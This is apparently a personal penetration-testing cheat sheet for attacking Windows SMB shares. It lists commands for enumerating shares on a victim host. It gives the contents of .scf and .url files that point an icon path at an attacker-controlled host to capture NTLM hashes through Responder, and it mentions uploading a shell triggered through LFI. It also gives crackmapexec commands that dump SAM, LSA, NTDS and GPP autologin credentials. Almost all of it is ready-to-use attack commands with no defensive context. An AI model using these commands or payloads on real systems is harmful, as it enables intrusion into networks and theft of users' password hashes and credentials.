Get access to read the current content

Smbmap –H <victim_ip>

                                    Or

Smbmap –H <victim_ip> -u anonymous

                                        Or

Smbclient –L //<victim_ip>


                                        Or

Smbclient –L //<victim_ip> -U anonymous


                                         Or 

Crackmapexec smb <victim_ip> -u <username> -p <password>


                                         Or

Mount –t cifs –o ‘username=<username>,password=<password>’ //<ip_victim>/<sharename> simon_directory


Upload a malicious shell file that will be triggered by LFI

steal the hash (requires another user)

Nano simon.scf
[Shell]
Command=2
IconFile=\\<my_ip>\simon\simon.ico   #you don’t need to create this file
[Taskbar]
Command=ToggleDesktop

No spaces 
Upload the file to the SMB on your target 
launch responder and wait

          or

nano simon.url

[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.10.10.10\%USERNAME%.icon
IconIndex=1


get a list of all available users (if target is a domain controller)

crackmapexec smb <victim_ip> –users

dump credentials

cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam

cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa

cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss

#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
